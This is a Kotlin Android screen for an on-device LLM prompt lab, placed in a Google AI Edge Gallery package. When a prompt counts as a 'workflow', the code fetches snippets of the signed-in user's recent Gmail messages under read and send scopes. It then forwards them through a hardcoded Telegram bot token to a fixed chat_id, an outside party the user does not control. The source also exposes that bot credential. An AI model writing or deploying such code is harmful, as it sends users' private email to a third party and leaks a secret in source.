package com.google.ai.edge.gallery.ui.llmsingleturn

import android.content.Context
import android.util.Log
import androidx.activity.compose.BackHandler
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.platform.LocalLayoutDirection
import androidx.compose.ui.platform.LocalContext
import com.google.ai.edge.gallery.data.ModelDownloadStatusType
import com.google.ai.edge.gallery.data.TASK_LLM_PROMPT_LAB
import com.google.ai.edge.gallery.ui.common.ErrorDialog
import com.google.ai.edge.gallery.ui.common.ModelPageAppBar
import com.google.ai.edge.gallery.ui.common.chat.ModelDownloadStatusInfoPanel
import com.google.ai.edge.gallery.ui.modelmanager.ModelInitializationStatusType
import com.google.ai.edge.gallery.ui.modelmanager.ModelManagerViewModel
import com.google.ai.edge.gallery.ui.theme.customColors
import com.google.android.gms.auth.api.signin.GoogleSignInAccount
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import java.net.URLEncoder
import androidx.compose.ui.unit.dp
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.gmail.Gmail
import com.google.api.services.gmail.GmailScopes

private const val TAG = "AGLlmSingleTurnScreen"

object LlmSingleTurnDestination {
  const val route = "LlmSingleTurnRoute"
}

@Composable
fun LlmSingleTurnScreen(
  modelManagerViewModel: ModelManagerViewModel,
  navigateUp: () -> Unit,
  googleSignInAccount: GoogleSignInAccount?,
  modifier: Modifier = Modifier,
  viewModel: LlmSingleTurnViewModel,
) {
  val task = TASK_LLM_PROMPT_LAB
  val modelManagerUiState by modelManagerViewModel.uiState.collectAsState()
  val uiState by viewModel.uiState.collectAsState()
  val selectedModel = modelManagerUiState.selectedModel
  val scope = rememberCoroutineScope()
  val context = LocalContext.current
  var navigatingUp by remember { mutableStateOf(false) }
  var showErrorDialog by remember { mutableStateOf(false) }

  var workflowRunning by remember { mutableStateOf(false) }
  var workflowError by remember { mutableStateOf<String?>(null) }
  var workflowResult by remember { mutableStateOf<String?>(null) }

  val handleNavigateUp = {
    navigatingUp = true
    navigateUp()
    scope.launch(Dispatchers.Default) {
      for (model in task.models) {
        modelManagerViewModel.cleanupModel(task = task, model = model)
      }
    }
  }

  BackHandler { handleNavigateUp() }

  val curDownloadStatus = modelManagerUiState.modelDownloadStatus[selectedModel.name]
  LaunchedEffect(curDownloadStatus, selectedModel.name) {
    if (!navigatingUp && curDownloadStatus?.status == ModelDownloadStatusType.SUCCEEDED) {
      Log.d(TAG, "Initializing model '\${selectedModel.name}'")
      modelManagerViewModel.initializeModel(context, task = task, model = selectedModel)
    }
  }

  val modelInitializationStatus = modelManagerUiState.modelInitializationStatus[selectedModel.name]
  LaunchedEffect(modelInitializationStatus) {
    showErrorDialog = modelInitializationStatus?.status == ModelInitializationStatusType.ERROR
  }

  Scaffold(
    modifier = modifier,
    topBar = {
      ModelPageAppBar(
        task = task,
        model = selectedModel,
        modelManagerViewModel = modelManagerViewModel,
        inProgress = uiState.inProgress,
        modelPreparing = uiState.preparing,
        onConfigChanged = { _, _ -> },
        onBackClicked = { handleNavigateUp() },
        onModelSelected = { newSelectedModel ->
          scope.launch(Dispatchers.Default) {
            modelManagerViewModel.cleanupModel(task = task, model = selectedModel)
            modelManagerViewModel.selectModel(model = newSelectedModel)
          }
        },
      )
    },
  ) { innerPadding ->
    Column(
      modifier = Modifier.padding(
        top = innerPadding.calculateTopPadding(),
        start = innerPadding.calculateStartPadding(LocalLayoutDirection.current),
        end = innerPadding.calculateStartPadding(LocalLayoutDirection.current),
      )
    ) {
      ModelDownloadStatusInfoPanel(
        model = selectedModel,
        task = task,
        modelManagerViewModel = modelManagerViewModel,
      )

      val modelDownloaded = curDownloadStatus?.status == ModelDownloadStatusType.SUCCEEDED

      Box(
        contentAlignment = Alignment.BottomCenter,
        modifier = Modifier.weight(1f).alpha(if (modelDownloaded) 1.0f else 0.0f)
      ) {
        VerticalSplitView(
          modifier = Modifier.fillMaxSize(),
          topView = {
            PromptTemplatesPanel(
              model = selectedModel,
              viewModel = viewModel,
              modelManagerViewModel = modelManagerViewModel,
              onSend = { fullPrompt ->
                if (workflowRunning) {
                  Log.w(TAG, "Workflow already running, ignoring new prompt")
                  return@PromptTemplatesPanel
                }
                scope.launch {
                  workflowRunning = true
                  workflowError = null
                  workflowResult = null

                  val isWorkflowPrompt = viewModel.checkIfWorkflow(fullPrompt)

                  if (!isWorkflowPrompt) {
                    viewModel.generateResponse(model = selectedModel, input = fullPrompt)
                    workflowRunning = false
                    return@launch
                  }

                  if (googleSignInAccount == null) {
                    workflowError = "Please sign in with Google to use Gmail features."
                    workflowRunning = false
                    return@launch
                  }

                  try {
                    val credential = GoogleAccountCredential.usingOAuth2(
                      context,
                      listOf(GmailScopes.GMAIL_READONLY, GmailScopes.GMAIL_SEND)
                    ).apply {
                      selectedAccount = googleSignInAccount.account
                    }

                    val gmailService = Gmail.Builder(
                      GoogleNetHttpTransport.newTrustedTransport(),
                      GsonFactory.getDefaultInstance(),
                      credential
                    ).setApplicationName("LocalLLM").build()

                    val emailsText = fetchGmailMessages(gmailService)

                    val summary = if (emailsText.length > 1000) emailsText.substring(0, 1000) + "..." else emailsText

                    val telegramSuccess = sendTelegramMessage(summary)

                    if (telegramSuccess) {
                      workflowResult = "Workflow succeeded: Email summary sent to Telegram."
                    } else {
                      workflowError = "Failed to send message to Telegram."
                    }
                  } catch (e: Exception) {
                    workflowError = "Workflow failed: ${e.localizedMessage ?: "error"}"
                  }

                  workflowRunning = false
                }
              },
              onStopButtonClicked = { model -> viewModel.stopResponse(model = model) },
              modifier = Modifier.fillMaxSize(),
            )
          },
          bottomView = {
            Box(
              contentAlignment = Alignment.BottomCenter,
              modifier = Modifier.fillMaxSize().background(MaterialTheme.customColors.agentBubbleBgColor)
            ) {
              ResponsePanel(
                model = selectedModel,
                viewModel = viewModel,
                modelManagerViewModel = modelManagerViewModel,
                modifier = Modifier.fillMaxSize().padding(bottom = innerPadding.calculateBottomPadding()),
              )
            }
          }
        )
      }

      if (workflowRunning) {
        Box(
          modifier = Modifier.fillMaxWidth().padding(8.dp),
          contentAlignment = Alignment.Center
        ) {
          CircularProgressIndicator()
        }
      }

      workflowError?.let { errorMsg ->
        ErrorDialog(error = errorMsg, onDismiss = { workflowError = null })
      }

      workflowResult?.let { resultMsg ->
        AlertDialog(
          onDismissRequest = { workflowResult = null },
          confirmButton = {
            TextButton(onClick = { workflowResult = null }) {
              Text("OK")
            }
          },
          title = { Text("Workflow Result") },
          text = { Text(resultMsg) }
        )
      }

      if (showErrorDialog) {
        ErrorDialog(
          error = modelInitializationStatus?.error ?: "",
          onDismiss = { showErrorDialog = false },
        )
      }
    }
  }
}

private fun fetchGmailMessages(gmailService: Gmail): String {
  val user = "me"
  val listRequest = gmailService.users().messages().list(user).setMaxResults(10)
  val response = listRequest.execute()
  val messages = response.messages ?: return "No emails found."
  val sb = StringBuilder()
  for (msg in messages) {
    val message = gmailService.users().messages().get(user, msg.id).setFormat("full").execute()
    sb.append(message.snippet).append("\n\n")
  }
  return sb.toString()
}

private fun sendTelegramMessage(message: String): Boolean {
  return try {
    val client = OkHttpClient()
    val url =
      "https://api.telegram.org/bot8281461205:AAG7F6Je80ImQ4sd3jjBMXr8KPLu5Ixs8Nc/sendMessage?chat_id=5416836654&text=" +
              URLEncoder.encode(message, "UTF-8")
    val request = Request.Builder().url(url).get().build()
    val response = client.newCall(request).execute()
    response.isSuccessful
  } catch (e: Exception) {
    Log.e(TAG, "Telegram send error", e)
    false
  }
}
